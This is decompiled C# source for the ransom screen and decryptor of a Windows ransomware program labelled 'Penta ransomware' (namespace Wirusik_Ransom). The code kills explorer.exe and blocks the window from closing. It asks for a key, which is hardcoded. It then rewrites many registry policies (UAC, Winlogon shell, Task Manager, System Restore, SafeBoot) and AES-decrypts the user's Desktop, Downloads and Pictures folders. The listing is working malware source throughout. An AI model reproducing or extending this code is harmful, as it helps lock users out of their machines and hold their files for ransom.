using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Wirusik_Ransom.Properties;

namespace Wirusik_Ransom;

public class Form2 : Form
{
	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private IContainer components = null;

	private Label label1;

	private Label label2;

	private TextBox textBox1;

	private Button button1;

	private Timer tmr_decrypt;

	public Form2()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		if (((Control)textBox1).get_Text() == "57458675489675946754867")
		{
			MessageBox.Show("The key is correct", "correct key", (MessageBoxButtons)0, (MessageBoxIcon)64);
			tmr_decrypt.Start();
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
			RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
			registryKey3.SetValue("Ransom", 0, RegistryValueKind.String);
			RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey4.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
			registryKey5.SetValue("NoControlPanel", 0, RegistryValueKind.DWord);
			RegistryKey registryKey6 = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
			registryKey6.SetValue("MinimalX", 0, RegistryValueKind.DWord);
			RegistryKey registryKey7 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestore");
			registryKey7.SetValue("DisableSR", 0, RegistryValueKind.DWord);
			RegistryKey registryKey8 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestore");
			registryKey8.SetValue("DisableConfig", 0, RegistryValueKind.DWord);
			RegistryKey registryKey9 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey9.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.Arguments = "/k taskkill /f /im Ransom.exe";
			Process.Start(processStartInfo);
		}
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/k taskkill /f /im explorer.exe";
		Process.Start(processStartInfo);
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void tmr_decrypt_Tick(object sender, EventArgs e)
	{
		tmr_decrypt.Stop();
		decrypt();
	}

	private void decrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(folderPath2 + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "57458675489675946754867";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
		}
		for (int k = 0; k < files3.Length; k++)
		{
			decryptionFile.DecryptFile(files3[k], password);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0210: Unknown result type (might be due to invalid IL or missing references)
		//IL_021a: Expected O, but got Unknown
		//IL_0390: Unknown result type (might be due to invalid IL or missing references)
		//IL_039a: Expected O, but got Unknown
		components = new Container();
		label1 = new Label();
		label2 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		tmr_decrypt = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Black);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 48f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(71, 27));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(1368, 73));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Your files are encrypted by Penta ransomware!");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Black);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 72f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(294, 590));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(922, 108));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Write key for decrypt");
		((Control)textBox1).set_Location(new Point(470, 742));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(568, 20));
		((Control)textBox1).set_TabIndex(2);
		((Control)button1).set_BackColor(Color.Black);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_ForeColor(Color.Red);
		((Control)button1).set_Location(new Point(470, 782));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(568, 59));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		tmr_decrypt.set_Enabled(true);
		tmr_decrypt.set_Interval(300);
		tmr_decrypt.add_Tick((EventHandler)tmr_decrypt_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.Annabelle_tear);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(1473, 885));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form2");
		((Control)this).set_Text("Form2");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
